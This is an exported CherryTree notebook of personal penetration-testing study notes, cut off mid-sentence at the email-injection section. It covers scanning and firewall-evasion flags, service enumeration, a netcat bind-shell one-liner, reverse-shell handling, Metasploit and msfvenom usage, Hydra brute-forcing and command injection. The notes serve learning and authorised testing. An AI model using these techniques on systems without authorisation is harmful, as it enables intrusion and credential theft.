<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>cybernotes.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title level-1'>Penetration Testing</h1><br/></div><div class='page'><h1 class='title level-2'>Content Discovery</h1><br/>One of the initial steps of Penetration Testing is <strong>Content Discovery</strong>. This module will illustrate some common methods and tools used in this stage of pentesting.<br /><br /><strong>General Content Discovery</strong>:<br />• <em><span style="text-decoration:underline;">S3 Buckets</span></em>: storage service provided by amazon AWS. Poorly configured access permissions can allow access to files that souldn&#39;t be available to the public. The format of the S3 buckets is <code>http(s)://{name}.s3.amazonaws.com</code><br />• <em><span style="text-decoration:underline;">Port scanning</span></em> using <a href="Penetration_Testing--Content_Discovery--Nmap.html">nmap</a><br /><br /><strong>Webserver Content Discovery</strong>:<br />• browser extension <a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/">Wappalyzer</a> to discover web frameworks and more (NOTE: it&#39;s not always reliable)<br />• endpoint enumeration using gobuster<br />• subdomain enumeration:<br />   ◇ using <a href="Penetration_Testing--Content_Discovery--Gobuster.html">gobuster</a><br />   ◇ looking up a domain in a site like <a href="https://crt.sh">https://crt.sh</a>, only if the site is public and has a SSL/TLS certificate<br />   ◇ using google dorking: <code>-site:www.domain.com site:*.domain.com</code><br />   ◇ using dnsrecon: <code>dnsrecon -t brt -d domain.com</code><br />   ◇ using Sublist3r (<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a>)<br />• if the site is public, we can try to recover old versions of web pages on the Wayback Machine (<a href="https://archive.org/web/">https://archive.org/web/</a>)<br />• </div><div class='page'><h1 class='title level-3'>Nmap</h1><br/>Nmap is an extremely popular tool for port scanning a target.<br /><br />• typical command you want to run: <code>sudo nmap -vv -sC -sV &lt;ip&gt;</code><br />   ◇ this will print the results on screen, if you want them saved in a file use the option <code>-oN scanresults.txt</code><br />• <code>-p</code> option is used to tell nmap the range of <strong>ports</strong> to scan (by default Nmap scans the most common 1000 ports for each protocol):<br />   ◇ <code>-p 80</code> scans only port 80<br />   ◇ <code>-p 1000-1500</code> scans only from port 1000 to 1500<br />   ◇ <code>-p-</code> scans all the 65535 ports.<br /><br />• <em><span style="text-decoration:underline;">scan types</span></em>:<br />   ◇ <code>-sT (TCP Connect scan)</code>: nmap tries to perform the TCP three-way handshake (SYN, SYN/ACK, ACK) to each port:<br />      ▪ if after the initial SYN packet, the server returns a packet with the RST flag set, then nmap can establish the port is closed<br />      ▪ if the server does not respond, the port is considered <strong>filtered</strong>, because there&#39;s probably a firewall that is configured to just drop certain incoming packets.<br />         However that&#39;s not always the case, because a firewall can also be configured to respond with a RST TCP packet (this makes it difficult to get an accurate reading of a target).<br />   ◇ <code>-sS (SYN scans)</code>: similar to tcp scans, but nmap sends a RST packet after receiving a SYN/ACK from the server. These are the default scans of nmap if run with <strong>sudo</strong> permissions.▪ <br />      ▪ <em>Advantages</em>:<br />         - it can be used to bypass older Intrusion Detection systems, as they are looking for a full three way handshake (for this reason they are also referred as &quot;stealth&quot; scans)<br />         - these types of scans are often not logged by applications, as standard practice is to log a connection once it&#39;s been fully established<br />         - they are faster than TCP Connect scans, as nmap doesn&#39;t have to bother about disconnecting after the handshake<br />      ▪ <em>Disadvantages:</em><br />         - they require sudo permissions<br />         - unstables services are sometimes brought down by SYN scans<br />   ◇ <code>-sU (UDP scans)</code>: nmap send UDP packets to the server and hopes to receive a response. These scans are MUCH slower than TCP scans.<br />      ▪ if the server responds with a UDP packet (very unusual) then the server marked the port as open.<br />      ▪ if the server doesn&#39;t respond, it marks the port as open|filtered<br />      ▪ if the server responds with a IMCP packet with a message saying the port is unreachable, then nmap mark the port as closed<br />   ◇ <code>-sN (NULL scans)</code>: nmap send a TCP request with no flags set at all. This is a stealth scan, used to bypass firewalls that drop incoming TCP packets which have the SYN flag set.<br />      ▪ the server should respond with a RST packet if the port is closed<br />      ▪ if the port is open, or if there&#39;s a firewall, there SHOULD (according to RFC 793) be no response to the malformed packet, and the port is marked as open|filtered.<br />      ▪ if the target responds with an ICMP unreachable packet, the port is marked as filtered<br />   ◇ <code>-sF (FIN scans)</code>: nmap send a TCP request with the FIN flag set. Same considerations as -sN<br />   ◇ <code>-sX (Xmas scans)</code>: sends a malformed TCP packet. Same considerations as -sN<br /> <br />   ◇ <strong>ICMP Network Scanning</strong>: if we want to perform a &#39;ping sweep&#39;, we use the -sn switch (don&#39;t scan any ports) specifying the IP range with either a hyphen:<br />      <code>nmap -sn 192.168.0.1-254</code><br />      or CIDR notation:<br />      <code>nmap -sn 192.168.0.0/24</code><br />      ▪ if ran on a local network as sudo, it relies on ARP requests, otherwise on ICMP echo packets<br />      ▪ some firewalls (like the Windows one) block all ICMP packets. We can force nmap to scan every IP without trying to ping it first by using the option <code>-Pn</code>. The downside of course is that this type of scan requires a LOT of time.<br /><br />• other common firewalls evasion techniques:<br />   ◇ <code>--badsum</code>: used to generate invalid checksum for packets. Can be used to determine the <strong>presence</strong> of a firewall/IDS, since these may potentially respond without checking the checksum. If there&#39;s not a firewall, the packet instead reaches the host and is immediately dropped as soon as the checksum is checked.<br />   ◇ <code>-f</code> or <code>--mtu &lt;number&gt;</code> to fragment the packets (automatically in the first case, manually in the second)<br />   ◇ <code>--scan-delay  &lt;time&gt;ms</code> to add a delay between packets sent. Useful to evade any time-based triggers of firewalls/IDS<br /><br />• NSE (Nmap scripting engine): executes scripts written in Lua language, that can scan for vulnerabilities or even automate exploits<br />   ◇ every script is of a category that identify how much impactful on the target the script is (safe, intrusive, etc.)<br />   ◇ to execute scripts there&#39;s the switch --script, that can be used in multiple ways: <code>--script=&lt;category&gt;</code> or <code>--script=&lt;name_of_script&gt; --script-args scriptname.arg1=value,scriptname.arg2=value2,(...)</code><br /><br />• useful links:<br />   ◇ <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a>   for a complete list of nse scripts (also present in <code>/usr/share/nmap/scripts</code>, with the complete list in scripts.db)<br />   ◇ <a href="https://nmap.org/book/man-bypass-firewalls-ids.html">https://nmap.org/book/man-bypass-firewalls-ids.html</a>  for more ways of bypassing firewalls</div><div class='page'><h1 class='title level-3'>Gobuster</h1><br/>Gobuster is a tool used to brute-force (or enumerate):<br /><br /><strong>Directory and files in a web sites</strong>:<br /><br /><code>gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php, html</code><br />• <code>-x</code> is optional and it tells gobuster to search also for file with .php and .html extensions<br /><br /><strong>Subdomains of a website</strong>:<br /><br /><strong>Virtual Hosts</strong>:<br /><br /><strong>Open Amazon S3 Buckets</strong>:<br /></div><div class='page'><h1 class='title level-3'>Google Dorking</h1><br/>• if we google something between quotation marks, google will interpret that as exact and only return the results of the the exact phrase provided<br />• if we insert <code>site:</code> before our research, Google returns with fewer results, and it&#39;s more likely that we find the website we were looking for<br />• <code>filetype:</code> search for a file by its extension<br />• <code>cache:</code> view google&#39;s cached version of a specified url<br />• <code>intitle:</code> the phrase must appear in the title of the page. DANGEROUS NOTE: if you search for <code>intitle:index.of</code> you may see endpoints that should probably be hidden. Clicking on the results is discouraged :)<br />• <code>inurl:</code> returns results that have the specified word in the URL<br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Exploitation</h1><br/></div><div class='page'><h1 class='title level-3'>Network Services</h1><br/>Here is a list of common network services you may find when targeting a machine.<br />For every service: <br />• I first try to explain what it does, how it works and how to connect to it (<em>Description</em>)<br />• how to extract useful information from it, with or without being authenticated (<em>Enumeration</em>)<br />• common misconfigurations or vulnerabilities (<em>Exploitation</em>)<br /><br /><strong>Useful links about network services in general</strong>:<br />• <a href="https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html">https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html</a></div><div class='page'><h1 class='title level-4'>SSH</h1><br/><strong>SSH</strong> (defualt port: 22)<br /><br />• <em><span style="text-decoration:underline;">Description</span></em><em>:</em><br />   ◇ service to execute commands in a remote machine securely<br />   ◇ to access to a machine through ssh, we can use <code>ssh username@ip -p port</code><br />      ▪ if <code>-p</code> is not provided, ssh will try to connect to port 22<br />      ▪ if a username is not provided, ssh will try to connect using the username of your machine<br />      ▪ if the ssh server requires a private ssh key to log in, we have to add the option <code>-i path_to_privatekey</code><br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br /><br />• <em><span style="text-decoration:underline;">Exploitation</span></em>:<br />   ◇ private ssh keys should <strong><span style="text-decoration:underline;">never</span></strong> be stored in the remote machine. This is a common misconfiguration that may be exploited, if we have read permissions to the key file<br />   ◇ private ssh keys can be protected with a password. If the password is weak, we can easily crack it using John The Ripper<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>SMB</h1><br/><strong>SMB</strong>: (default ports: 139 for NetBIOS, 445 for TCP/IP)<br /><br />• <em><span style="text-decoration:underline;">Description</span></em>:<br />   ◇ response-request protocol used to share various resources on a network<br />   ◇ client first establishes a connection with the server, then it can sends commands to share, open, read and write files.<br />   ◇ runs on windows, and also linux through an open source server called Samba<br />   ◇ SMB share: a sort of filesystem that can be private or anonymous (public)<br />   ◇ to connect to a share we use <code>SMBClient</code> like this: <code>smbclient //IP/SHARE -U user -p port</code><br /><br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br />   ◇ <code>enum4linux</code> is a good tool to do that (already installed in Kali). The usual command you want to run is: <code>enum4linux -a 10.10.10.10</code><br /><br /><br />• <em><span style="text-decoration:underline;">Exploitation</span></em>:<br />   ◇ (<em>pretty rare</em>) CVE-2017-7494: allows RCE without even having any authorization<br />   ◇ misconfigurations in the system, usually an anonymous share that contains sensitive information.<br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Telnet</h1><br/><strong>Telnet</strong>: (default ports: 23)<br /><br />• <em><span style="text-decoration:underline;">Description</span></em>:<br />   ◇ telnet is an application protocol (client-server) that let you connect and execute commands on a remote machine that is hosting a telnet server<br />   ◇ WAY more unsafe than ssh, all messages are sent in clear text and there are no specific security mechanisms<br />   ◇ to connect to a telnet server we use the command <code>telnet ip port</code><br /><br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br />   ◇ there are no specific tools, <a href="Penetration_Testing--Content_Discovery--Nmap.html">nmap</a> is sufficient to do that<br /><br /><br />◇ <em><span style="text-decoration:underline;">Exploitation</span></em>:<br /><br /></div><div class='page'><h1 class='title level-4'>FTP</h1><br/><strong>FTP</strong>: (default ports: 21)<br /><br />• <em><span style="text-decoration:underline;">Description</span></em>:<br />   ◇ client-server protocol used to allow remote transfer of files over a network<br />   ◇ command channel, used for transmitting commands, and data channel, used for transmitting data<br />   ◇ FTP server may support wether active or passive connections, or both<br />      ▪ Passive FTP connection, the server opens a port and the client connects to it<br />      ▪ Active FTP connection, the client opens a port and listen. The server is required to actively connect to it<br />   ◇ FTP share: sort of filesystem that can be protected or anonymous (you don&#39;t need login credentials to access it)<br />   ◇ to connect to a ftp server use the command <code>ftp ip port</code>. The server will then ask for a username and a password.<br />      ▪ If you want to login anonymously, type <code>anonymous</code> in the username prompt, and just hit return when it asks for a password.<br />      ▪ use <code>ls</code> to list files and directories in the remote directory, <code>get</code> to download a file from the remote machine, <code>put</code> to upload a local file to the remote machine<br /><br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br />   ◇ there are no specific tools to do that, <a href="Penetration_Testing--Content_Discovery--Nmap.html">nmap</a> is sufficient to reveal any anonymous shares<br />   ◇ with some FTP servers it&#39;s possible to enumerate all the users without being authenticated by using the command cwd (<a href="https://www.exploit-db.com/exploits/20745">https://www.exploit-db.com/exploits/20745</a>)<br /><br /><br />• <em><span style="text-decoration:underline;">Exploitation</span></em>: <br />   ◇ FTP traffic is unencrypted, leaving it vulnerable to a man-in-the-middle attack. Its secure version is called SFTP<br />   ◇ anonymous shares can contain sensitive data<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>NFS</h1><br/><strong>NFS</strong>: (default ports: 111 (may be called rpcbind), 2049 for daemon)<br /><br />• <em><span style="text-decoration:underline;">Description</span></em>:<br />   ◇ used for file sharing between computers<br />   ◇ the client first requests the server to mount a remote directory on a local directory (the same way it can mount a physical device).<br />   ◇ the mount service checks if the user has the permission to access those files, and returns a file handle which identifies every file and directory on the server.<br />   ◇ when a user wants to access a file, an RCP call to NSFD (NSF daemon) is made with the appropriate parameters<br />   ◇ to access a NFS share, we can use this command (replace /tmp/mount with another directory if you want): <code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code><br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br />   ◇ use the command <code>showmount -e ip</code> to list all the visible NFS shares<br /><br /><br />• <em><span style="text-decoration:underline;">Exploitation</span></em>:<br />   ◇ privilege escalation with NFS server active: if we have a low privilege shell, and we have access to the NFS share, we can upload an executable file with the SUID bit set to get a shell with root privileges.<br />      <strong>NOTE</strong>: this works ONLY if &quot;<strong>root squashing</strong>&quot;is disabled! If it&#39;s enabled, this prevents anyone connecting to the NFS share from having root access.<br /></div><div class='page'><h1 class='title level-4'>SMTP</h1><br/><strong>SMTP</strong>: (default ports: 25)<br /><br />• <em><span style="text-decoration:underline;">Description</span></em>:<br />   ◇ it&#39;s one of two protocols necessary for email transfer. SMTP is used to handle the sending (and part of the reception) of messages:▪ <br />      ▪ first the mail user agent (email client or external program) connects to its SMTP server (example: smtp.gmail.com) with a <strong>SMTP handshake</strong> (won&#39;t be shown in detail here)<br />      ▪ if the recipient&#39;s domain is the same of the SMTP server (example: john@gmail.com), the SMTP just sends the email to the respective POP/IMAP server. <br />         Otherwise, if it&#39;s different (example: john@yahoo.com), it makes a request to a DNS server to get the ip of the right SMTP server.<br />      ▪ once the ip is found, the SMTP server makes a connection to the recipient&#39;s SMTP server. If it fails to do that, the email gets put into an SMTP queue<br />      ▪ the recipient&#39;s SMTP server receives the email and checks if the domain and the user name of the incoming email have been recognised. And then it forwads the email to the right POP/IMAP server.<br />   ◇ The POP/IMAP server handles part of the reception of the emails and uses two protocols: POP and IMAP▪ POP downloads all the messages from the inbox to the client, IMAP just downloads the new messages.<br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br />   ◇ vulnerable mail servers can provide an inital foothold into a network<br />   ◇ to find out the version of an SMTP server we can use the &quot;smtp_version&quot; module of MetaSploit<br />   ◇ to enumerate users, we can use the &quot;smtp_enum&quot; module of MetaSploit, which uses two internal commands of SMTP: VRFY to verify the name of valid users, and EXPN which reveals the actual address of user&#39;s aliases and lists of e-mail<br />   ◇ an alternative to that is the command <code>smtp-user-enum</code><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>MySQL</h1><br/><strong>MySQL:</strong> (default ports: 3306)<br />• <strong>NOTE:</strong> here I do <strong>NOT</strong> explain SQL injections. Here I explain what to do in case a server has a MySQL port open!<br /><br />• <em><span style="text-decoration:underline;">Description</span></em>:<br />   ◇ RDBMS, Relational Database Management System<br />   ◇ Databases: the most common way to store a large amount of data in a format that is easily accessible from many locations at once<br />      ▪ can be set up on dedicated servers or stored as a single file on the computer (<strong>flat-file databases</strong>)<br />   ◇ commonly used as backend database for webservers<br />   ◇ In MySQL the keyword &quot;SCHEMA&quot; is the same as &quot;DATABASE&quot;<br />   ◇ MySQL hashes are used to index data into a hash table, so that searching and accessing data is more efficient<br />   ◇ we can connect to a MySQL server using the command <code>mysql -h IP -P port -u username -p</code><br />      ▪ in alternative we can use the &quot;mysql_sql&quot; module of metasploit<br /><br />• <em><span style="text-decoration:underline;">Enumeration</span></em>:<br />   ◇ usually not the first point of call when getting inital information on a server.<br />   ◇ we can use the &quot;mysql_schemadump&quot; module of metasploit to dump all the structure of databases (this returns a LOT of data) or the &quot;mysql_hashdump&quot; module to dump all the MySQL hashes (included eventual hashed passwords!)<br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Shells</h1><br/>This module is all about shells, the tool we want to obtain from a server when we find a RCE vulnerablity.<br /><br />Here is an <em>extremely</em> useful site if we want to craft commands that spawn shells (<a href="https://www.revshells.com/">https://www.revshells.com/</a>)<br /><br />• <strong>Reverse shell</strong>: the target executes code that connects <em>back</em> to your computer. This method bypasses firewall rules that block connections to arbitrary ports. The downside is that you need to set up a listener on your machine using the command <code>sudo nc -lvnp &lt;port&gt;</code> , and create a tcp tunnel with ngrok if your machine is not reachable by the internet<br />• <strong>Bind shell (less common)</strong>: the target executes code that starts a listener on an arbitrary port of the server (for example <code>nc -lvnp &lt;port&gt; -e /bin/bash</code>. The port has to be below 1024, otherwise you need sudo privileges). The attacker then connects to the port to access the shell.<br />• <strong>WebShell</strong>: a webpage that contains script (like PHP or ASP) that executes code on the server. This is usually just the first step to get a more stable and easy to use reverse/bind shell.<br />   A collection of webshells can be found in <code>/usr/share/webshells</code> (only if you&#39;re using kali of course)<br />• <strong>Interactivity</strong>: a shell is said interactive if it allows you to interact with programs after executing them<br />• <strong>Staged vs Stageless payloads</strong>: stageless payloads are the more common type, they&#39;re just one piece of code that when executed, sends a shell back immediately to the waiting listener. Staged payloads, on the other hand, are divided in two parts: first the <em>stager</em> is sent, that doesn&#39;t contain any reverse shell code but it just connects back to a listener. The actual shellcode (also called <em>stage</em>) is loaded and executed through this connection, so that it won&#39;t probably be caught by anti-virus softwares.<br /><br />• <strong>How to stabilize a shell</strong>: the first thing we do when obtaining a shell is to stabilize it, that means enabling auto-completion, command history and most importantly, prevent it from killing it with Ctrl+C<br />   ◇ <em>[Only Linux shells]</em> Using python:<br />      1- run on the shell  <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> <br />         - NOTE: you may need to specify the version of Python, so use <code>python2</code> or <code>python3</code> instead of <code>python</code><br />      2- run on the shell <code>export TERM=xterm</code><br />      3- background the shell (Ctrl+Z) and run <code>stty raw -echo;fg</code>. <br />         - After you kill the shell you won&#39;t be able to see what you write, just type <code>reset</code> and press enter to re-enable all the features of the terminal, or close and reopen the terminal<br />         - NOTE: change the terminal tty size using <code>stty rows &lt;number&gt;</code> and <code>stty cols &lt;number&gt;</code> if some commands overwrite everything on the screen. You can see the tty size of your default terminal using <code>stty -a</code><br />   ◇ <em>[Windows and Linux shells]</em> Using rlwrap:<br />      ▪ when setting up the listener, run <code>rlwrap nc -lvnp &lt;port&gt;</code><br />      ▪ you still have to execute <code>stty raw -echo; fg</code> to fully stabilize the shell<br />   ◇ <em>[Only Linux shells]</em> Using Socat: socat has more features than netcat (like encrypted shells), but has the disadvantage that it only works if the target has socat installed (and that&#39;s pretty rare). It won&#39;t be explained here.<br /><br />• <strong>Upgrading to a &quot;normal&quot; shell</strong>: once we have a shell, the next thing we want to do is creating a way to access the machine using a &quot;normal&quot; method like ssh.<br /><br />• Notes:<br />   ◇ the option <code>-e</code> of netcat is not included in most versions of netcat<br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Tools</h1><br/></div><div class='page'><h1 class='title level-4'>Metasploit</h1><br/>Metasploit is a very powerful tool used to execute exploits on a target. To start using this tool, you need to run the command <code>msfconsole</code><br /><br />Here are the most important commands:<br />• use the command <code>search</code> to find various modules<br />• use the command <code>use</code> to select a module +<br />   ◇ the full path of the module returned by search OR<br />   ◇ the index of the module in the search result (in the &#39;#&#39; column)<br />• use the command <code>info</code> to view information about a specific module or the one that we selected.<br />• every module has some options that have to be set before launching the exploit. To get a list of them, use the command <code>options</code><br />• use the command <code>set VAR_NAME value</code> to set a variable&#39;s value, and the equivalent <code>get</code> command to retrieve the value<br />   ◇ to change the value of a variable to null use the command <code>unset</code><br />• there are some variables (like RHOSTS, the target ip address) that are common to all modules. For this reason you can set global variables with the commands <code>setg</code> and <code>getg</code> (and also <code>unsetg</code>)<br />• use <code>exploit</code> or <code>run</code> to execute the exploit<br />• use <code>sessions -i SESSION_NUMBER</code> to connect to a particular session (a.k.a. instance of an exploit). use the command without any option to list all sessions.<br />• use <code>db_nmap</code> to scan ports of a server and feed results directly into the database (you have to run <code>msfdb init</code> first, I think?)<br />   ◇ once the scan is over you can use commands like <code>hosts</code>, <code>services</code>, <code>vulns</code> to see the results and find eventual vulnerabilities<br /><br />• once a payload is successful we&#39;ll obtain a <strong>meterpeter</strong> shell, from which we can run other payloads or just elevate to a normal shell. Here are the most important commands:<br />   ◇ <code>sysinfo</code> to get information about the system<br />   ◇ <code>upload</code> to upload a file to the target<br />   ◇ <code>load</code> to load a meterpeter extension (more below)<br />   ◇ <code>run</code> to run a meterpeter script<br />   ◇ <code>shell</code> to drop into a system command shell (if you quit the shell, you&#39;ll be sent back to the meterpeter command line)<br />      ▪ if you need a powershell shell, use <code>load powershell</code> and then <code>powershell_shell</code><br />   ◇ <code>bg</code> to background the session and return to metasploit console<br />   ◇ <code>migrate PID</code> to move the meterpeter process to another (more stable) process<br /><br />• metasploit extensions<br />   ◇ kiwi (mikikatz)<br /><br />• metasploit scripts<br />   ◇ <code>multi/handler</code>, useful tool for catching reverse shells and for staged payloads<br />   ◇ <code>post/multi/recon/local_exploit_suggester</code>, useful script to check for various exploits we can run to elevate privileges<br />   ◇ <code>post/windows/gather/checkvm</code> to determine if a windows machine is in a vm<br />   ◇ <code>post/windows/manage/enable_rdp</code> to force RDP to be available in a windows machine<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Msfvenom</h1><br/>msfvenom is a tool that is part of the metasploit framework, and it&#39;s used to generate payloads<br /><br />• <code>-p &lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code> option is used to specify the payload<br />   ◇ for windows 32bit targets the arch is not specified<br />   ◇ the stageless payloads are denoted with underscores (<code>shell_reverse_tcp</code>), the staged payloads are denoted with a foward slash (<code>shell/reverse_tcp</code>)<br />• <code>-f</code> option is used to specify the output format<br />• <code>-o</code> option is used to specify the output location and filename for the generated payload<br />• <code>LHOST=&lt;ip&gt;</code> option to specify the IP to connect back to<br />• <code>LPORT=&lt;port&gt;</code> option to specify the port<br />• use <code>msfvenom --list payloads</code> to list all avaliable payloads<br /><br /></div><div class='page'><h1 class='title level-4'>Ffuf</h1><br/>ffuz is a tool used to fuzz web applications. Here are the most common options<br /><br />• <code>-w</code> to specify a wordlist<br />   ◇ to specify more than a wordlist: <code>-w /wordlist1.txt:W1,/wordlist2,txt:W2</code><br />• <code>-X</code> to specify the request method (default: GET)<br />• <code>-d</code> to specify the data to send in the request&#39;s body<br />• <code>-H</code> to specify one or more headers (separated by a colon) to include in the request<br />• <code>-u</code> to specify the URL to make the request to<br />• to specify where ffuf has to insert the values of our wordlist in the request, we use the special keyword <code>FUZZ</code> in the -H, -d or -u options.<br />   ◇ if you specified more than one wordlist in the -w option, use the keywords <code>W1</code> and <code>W2</code> instead of FUZZ<br />• we can show only the responses that have certain characteristics using these options:◇ <br />   ◇ <code>-mc 200</code>, to select responses that have returned a 200 status code<br />   ◇ <code>-ml 10</code>, to select responses that have 10 lines<br />   ◇ <code>-mr &quot;Hi&quot;</code>, to select responses that contain the word &quot;Hi&quot;<br />   ◇ <code>-ms</code>, for the size of HTTP response<br />   ◇ <code>-mw 200</code>, to select responses that have 200 words<br />• we can do the opposite (exclude responses) using the similar options <code>-fc, -fl, -fr, -fs, -fw</code><br /><br /></div><div class='page'><h1 class='title level-4'>Hydra</h1><br/>password cracking tool that can perform dictionary attacks against more than 50 protocols<br /><br />• basic syntax: <code>hydra -t 4 -l user -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp</code><br />   ◇ -t : number of parallel connections per target<br />   ◇ -l : the name of the user<br />   ◇ -P : the path of the wordlist<br />   ◇ -vV : verbose mode<br />   ◇ ftp: the type of protocol<br /><br /><br /><br /></div><div class='page'><h1 class='title level-1'>Webservers & security</h1><br/></div><div class='page'><h1 class='title level-2'>Web Frameworks</h1><br/></div><div class='page'><h1 class='title level-3'>Django</h1><br/>Python framework, already installed with Kali!<br /><br />• To create a new project, run the command <code>django-admin startproject {project_name}</code><br /><br />• This creates a directory dedicated to your project, which contains:<br />   ◇ a directory named after your project<br />   ◇ a python script called manage.py, that lets you interact with your Django project in various ways, by running the command <code>python3 manage.py {command}</code><br />      The most common commands are<br />      ▪ <strong>migrate</strong>, to automatically configure new files (<em><strong>recommended to run after creating a new project</strong></em>) or migrate changes<br />      ▪ <strong>runserver</strong>, to deploy the website on your server. Append 0.0.0.0:8000 to the command to run the server only to your local network.<br />      ▪ <strong>createsuperuser</strong>, to create an admin account for your Django web admin panel (endpoint: /admin)<br />      ▪ <strong>startapp</strong>, to initialize an app for your project. Projects can have infinite amount of apps. The syntax is <code>python3 manage.py startapp {app_name}</code><br /><br />• How to create a website<br />   1) create an app using the command I explained above<br />   2) head over to settings.py and include your app name in *INSTALLED_APPS*<br />   3) Head over to urls.py and add this line in the array &#39;urlpatterns&#39;: <code>path(&#39;{app_name}/&#39;, include(&#39;{app_name}.urls&#39;))</code><br />      NB: You have also to import &#39;include&#39; from django.urls, otherwise you&#39;ll get an error!<br />   4) create a urls.py file in the app directory. Here&#39;s a template for that:<br /><br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># urls.py</span><br /><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">django.urls</span> <span style="color:#333333;font-weight:400">import</span> path<br /><br /><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">.</span> <span style="color:#333333;font-weight:400">import</span> views<br /><br />app_name = <span style="color:#3ad900;font-weight:400">&#39;{app_name}&#39;</span><br />urlpatterns = [<br />        path(<span style="color:#3ad900;font-weight:400">&#39;&#39;</span>, views.index, name=<span style="color:#3ad900;font-weight:400">&#39;index&#39;</span>)<br />]</pre></div><br /><br />&#39;index&#39; is the name of a function we need to define in views.py (see the image below for more info).<br />NB: let&#39;s say the first argument of path is &quot;/example&quot;. To access that, the endpoint becomes /{app_name}/example<br /><br />	5) write the function in the views.py. Here&#39;s a basic one:<br /><br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">django.http</span> <span style="color:#333333;font-weight:400">import</span> HttpResponse<br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">index</span>(request):<br />    <span style="color:#ff9d00;font-weight:700">return</span> HttpResponse(<span style="color:#3ad900;font-weight:400">&quot;Hello World!&quot;</span>)</pre></div><br />	6) migrate changes<br />	7) start the server, head over to the endpoint <code>/{app_name}</code> and you should see your app<br /><br /><br />• How does django handle http requests?<br /><br /><a href=""><img src="images/29-1.png" alt="images/29-1.png" /></a><br /><br />• <strong>Templates:</strong><br />   ◇ with templates Django is able to automatically generate HTML markdown<br />   ◇ templates need to be stored in a &#39;templates&#39; in your app&#39;s folder<br />   ◇ to understand how templates work let&#39;s look at this base.html file:<br /><br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span> <span style="color:#333333;font-weight:400">html&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;html</span> <span style="color:#3ad900;font-weight:400">lang=&#39;en&#39;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;head&gt;</span><br />        <span style="color:#7f0044;font-weight:400">&lt;meta</span> <span style="color:#333333;font-weight:400">charset=</span><span style="color:#3ad900;font-weight:400">&quot;UTF-8&quot;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br />        <span style="color:#7f0044;font-weight:400">&lt;title&gt;</span>{% block title %}My website {% endblock %}<span style="color:#7f0044;font-weight:400">&lt;/title&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/head&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;body&gt;</span><br /><br />        {% block content %} {% endblock %}<br /><br /><span style="color:#7f0044;font-weight:400">&lt;/body&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/html&gt;</span></pre></div><br /><br /><br />• let&#39;s create now an html file that inherits from base.html<br /><br /><div class="codebox"><pre>{% extends &#39;base.html&#39; %}<br /><br />{% block content %}<br /><br />Hello, World!<br /><br />{% endblock %}</pre></div><br /><br /><br /><br />•  to show this page to the client we need to modify our views.py, and we have to invoke the function <code>render(request, &#39;index.html&#39;)</code><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Web Security</h1><br/></div><div class='page'><h1 class='title level-3'>Web Vulnerabilities</h1><br/>Common Security Misconfigurations:<br />• default passwords (particularly common in embedded and IoT devices)<br />• overly detailed error messages<br />• not using HTTP security headers<br />• <strong>Poison Null Byte</strong> attack:<br />   ◇ used to bypass url filtering<br />   ◇ it&#39;s a NULL terminator, that means that the server will consider the string only up to that point (but not the url filter, that&#39;s why it works)<br />   ◇ the URL encoded bytes to use in the URL is <code>%2500</code><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Command Injection</h1><br/>• when web applications take input or user-controlled data and run them as system commands without properly sanitizing the input.<br />• there are two types of command injection<br />   ◇ <strong>active</strong>: the output is returned to the user. In this case we can just execute commands like <code>whoami</code> (which is both for linux and for windows!)<br />   ◇ <strong>blind</strong>: the output is not returned to the user.<br />      ▪ to check if we have command injection in the first place, we can open a netcat listener or listen incoming connections with tcpdump, and then use commands like ping or curl on the remote machine.<br />      ▪ if there&#39;s a firewall that prevents that, we can instead use commands like <code>sleep</code> (Linux) and <code>timeout</code> (Windows) and see if the application hangs for the seconds we specified<br /><br />• useful links and tools:<br />   ◇ <a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Email Injection</h1><br/>• allows attackers to send email messages without prior authorization by 